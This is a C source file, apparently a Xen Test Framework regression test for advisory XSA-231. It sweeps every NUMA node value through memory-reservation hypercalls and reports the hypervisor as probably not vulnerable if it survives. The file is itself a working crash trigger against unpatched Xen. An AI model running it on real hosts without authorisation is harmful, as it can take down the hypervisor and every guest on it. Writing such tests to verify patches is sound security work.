/**
 * @file tests/xsa-231/main.c
 * @ref test-xsa-231
 *
 * @page test-xsa-231 XSA-231
 *
 * Advisory: [XSA-231](https://xenbits.xen.org/xsa/advisory-231.html)
 *
 * Before XSA-231, the node parameter in xen_memory_reservation was passed
 * unaudited into the heap allocator, which ASSERT()ed it was range, then
 * proceeded to write into an array bounded by MAX_NUMANODES.
 *
 * This test loops over all node values in the mem_flags field, and pokes Xen
 * with each value.  If Xen is vulnerable, it will most likely crash.
 *
 * @see tests/xsa-231/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-231 PoC";

void test_main(void)
{
    struct xen_memory_reservation res = {
        .nr_extents = 1,
        .domid = DOMID_SELF,
    };

    /* Opencoded loop over each value in the node field of mem_flags. */
    for ( ; res.mem_flags < 0x10000; res.mem_flags += 0x100 )
        hypercall_memory_op(XENMEM_increase_reservation, &res);

    /* If Xen is alive at this point, it is probably not vulnerable. */

    xtf_success("Success: Probably not vulnerable to XSA-231\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
